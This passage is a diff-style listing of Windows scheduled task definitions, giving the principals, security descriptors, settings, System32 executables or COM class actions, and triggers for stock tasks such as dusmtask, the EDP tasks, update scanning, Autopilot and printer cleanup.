+  ExecutionTimeLimit                :   PT1H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {AB2A519B-03B0-43CE-940A-A73DF850B49A}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+
+  Name                              :   dusmtask
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   Users
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;S-1-5-80-4155767994-3874329934-3800885181-2130851812-726865888)(A;;FRFX;;;AU)(A;;FRFX;;;BU)(A;;FRFX;;;IU)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Execute                       :   %SystemRoot%\System32\dusmtask.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   EDP App Launch Task
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   Users
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
+      Data                          :   AppLaunch
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   EDP Auth Task
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   Users
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
+      Data                          :   ReAuth
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   EDP Inaccessible Credentials Task
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   Users
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
+      Data                          :   MissingCredentials
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   StorageCardEncryption Task
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   Users
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:P(A;;FRFX;;;AU)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {61BCD1B9-340C-40EC-9D41-D7F1C0632F05}
+      Data                          :   SDCardEncryptionPolicy
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   InputSettingsRestoreDataAvailable
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   Users
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT0S
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {378EAB97-EFD6-4ED5-9AD9-E64A6AA1E6FA}
+      Data                          :   InputSettingsRestoreDataAvailable
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   LocalUserSyncDataAvailable
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   Users
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT0S
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {8E7C2AFB-72B9-415C-9AC2-5037693309B7}
+      Data                          :   LocalUserSyncDataAvailable
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   MouseSyncDataAvailable
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   Users
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT0S
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {378EAB97-EFD6-4ED5-9AD9-E64A6AA1E6FA}
+      Data                          :   MouseSyncDataAvailable
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   PenSyncDataAvailable
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   Users
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT0S
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {378EAB97-EFD6-4ED5-9AD9-E64A6AA1E6FA}
+      Data                          :   PenSyncDataAvailable
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   syncpensettings
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   Users
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT1M
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {3ECEE215-83F5-4123-A592-74F1FE4C3D59}
+      Data                          :   SYNC_PEN_SETTINGS
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   TouchpadSyncDataAvailable
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   Users
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;AU)(A;;FA;;;BA)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT0S
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {378EAB97-EFD6-4ED5-9AD9-E64A6AA1E6FA}
+      Data                          :   TouchpadSyncDataAvailable
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   RestoreDevice
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   AllUsers
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT3H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {7F019157-05C8-473F-8664-2BA04A090DC8}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   ScanForUpdates
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT4H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {A558C6A5-B42B-4C98-B610-BF9559143139}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTimeTrigger
+      Enabled                       :   True
+      StartBoundary                 :   2013-12-31T16:00:00-08:00
+      Interval                      :   P1D
+      StopAtDurationEnd             :   False
+      RandomDelay                   :   P1D
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+      Type                          :   MSFT_TaskTimeTrigger
+      Enabled                       :   False
+      StartBoundary                 :   2013-12-31T16:00:00-08:00
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   ScanForUpdatesAsUser
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   AllUsers
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Running
+  SDDL                              :   D:(A;;FA;;;SY)(A;;FA;;;BA)(A;;FRFX;;;IU)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT4H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {DDAFAEA2-8842-4E96-BADE-D44A8D676FDB}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+
+  Name                              :   WakeUpAndContinueUpdates
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Disabled
+  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
+  Enabled                           :   False
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT4H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {0DC331EE-8438-49D5-A721-E10B937CE459}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+
+  Name                              :   WakeUpAndScanForUpdates
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Disabled
+  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
+  Enabled                           :   False
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT4H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {D5A04D91-6FE6-4FE4-A98A-FEB4500C5AF7}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTimeTrigger
+      Enabled                       :   True
+      StartBoundary                 :   2013-12-31T16:00:00-08:00
+      Interval                      :   P1D
+      StopAtDurationEnd             :   False
+      RandomDelay                   :   P1D
+      ------------------------------
+
+  Name                              :   Notifications
+  Principal                         :
+      GroupId                       :   Authenticated Users
+      Id                            :   Creator
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   
+  Description                       :   Location Notification
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;AU)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT0S
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Execute                       :   %windir%\System32\LocationNotificationWindows.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   WindowsActionDialog
+  Principal                         :
+      GroupId                       :   Authenticated Users
+      Id                            :   Creator
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   
+  Description                       :   Location Notification
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;AU)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT0S
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Execute                       :   %windir%\System32\WindowsActionDialog.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   DetectHardwareChange
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   $(@%SystemRoot%\system32\Autopilot.dll,-600)
+  Description                       :   $(@%SystemRoot%\system32\Autopilot.dll,-602)
+  Source                            :   $(@%SystemRoot%\system32\Autopilot.dll,-601)
+  State                             :   Disabled
+  SDDL                              :   
+  Enabled                           :   False
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {62B2DD2C-F129-42EE-BF59-55D3FD21C215}
+      Data                          :   DetectHardwareChange
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   RemediateHardwareChange
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   $(@%SystemRoot%\system32\Autopilot.dll,-600)
+  Description                       :   $(@%SystemRoot%\system32\Autopilot.dll,-603)
+  Source                            :   $(@%SystemRoot%\system32\Autopilot.dll,-601)
+  State                             :   Disabled
+  SDDL                              :   
+  Enabled                           :   False
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {62B2DD2C-F129-42EE-BF59-55D3FD21C215}
+      Data                          :   RemediateHardwareChange
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskBootTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      Delay                         :   PT1M
+      ------------------------------
+
+  Name                              :   Cellular
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   False
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   /turn 7 /source CellStateChangeTask
+      Execute                       :   %windir%\system32\ProvTool.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   Logon
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   False
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   /turn 5 /source LogonIdleTask
+      Execute                       :   %windir%\system32\ProvTool.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskLogonTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   MdmDiagnosticsCleanup
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Disabled
+  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;LS)
+  Enabled                           :   False
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   /clean
+      Execute                       :   %windir%\system32\MdmDiagnosticsTool.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskBootTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   Retry
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Disabled
+  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
+  Enabled                           :   False
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   False
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   /turn 5 /source ProvRetryTask
+      Execute                       :   %windir%\system32\ProvTool.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskBootTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   RunOnReboot
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Disabled
+  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
+  Enabled                           :   False
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   False
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Arguments                     :   /turn 5 /source ContinueSessionTask
+      Execute                       :   %windir%\system32\ProvTool.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskBootTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   SystemSoundsService
+  Principal                         :
+      GroupId                       :   Users
+      Id                            :   Group
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   
+  Description                       :   System Sounds User Mode Agent
+  Source                            :   Microsoft Corporation
+  State                             :   Running
+  SDDL                              :   D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;AU)
+  Enabled                           :   True
+  Date                              :   6/23/2005 2:48:00 PM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT0S
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {2DEA658F-54C1-4227-AF9B-260AB5FC3543}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskLogonTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   SecureBootEncodeUEFI
+  Principal                         :
+      GroupId                       :   
+      Id                            :   LocalSystem
+      LogonType                     :   Service
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   SYSTEM
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;AU)(A;;FRFX;;;LS)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT10S
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Execute                       :   %WINDIR%\system32\SecureBootEncodeUEFI.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskRegistrationTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+      Type                          :   MSFT_TaskBootTrigger
+      Enabled                       :   True
+      EndBoundary                   :   2025-12-31T12:00:00
+      StopAtDurationEnd             :   False
+      Delay                         :   PT5M
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StartBoundary                 :   2025-12-31T12:00:00
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   EduPrintProv
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   Users
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_LUA
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;WD)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   False
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   False
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      Execute                       :   %windir%\system32\eduprintprov.exe
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskTrigger
+      Enabled                       :   True
+      StopAtDurationEnd             :   False
+      ------------------------------
+
+  Name                              :   PrinterCleanupTask
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   InteractiveUsers
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   
+  Author                            :   
+  Description                       :   
+  Source                            :   
+  State                             :   Ready
+  SDDL                              :   D:P(A;;FA;;;AU)(A;;FA;;;SY)
+  Enabled                           :   True
+  Date                              :   1/1/0001 12:00:00 AM
+  AllowDemandStart                  :   True
+  DisallowStartIfOnBatteries        :   True
+  ExecutionTimeLimit                :   PT72H
+  StopIfGoingOnBatteries            :   True
+  Actions                           :
+      ------------------------------
+      Type                          :   MSFT_TaskAction
+      ClassId                       :   {C56F065E-DE49-4E42-BE7C-305C45609D25}
+      ------------------------------
+  Triggers                          :
+      ------------------------------
+      Type                          :   MSFT_TaskDailyTrigger
+      Enabled                       :   True
+      StartBoundary                 :   2020-01-01T12:00:00
+      StopAtDurationEnd             :   False
+      DaysInterval                  :   30
+      ------------------------------
+
+  Name                              :   PrintJobCleanupTask
+  Principal                         :
+      GroupId                       :   INTERACTIVE
+      Id                            :   InteractiveUsers
+      LogonType                     :   Batch
+      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
+      UserId                        :   
+  Author                            :   
+  Description                       :   
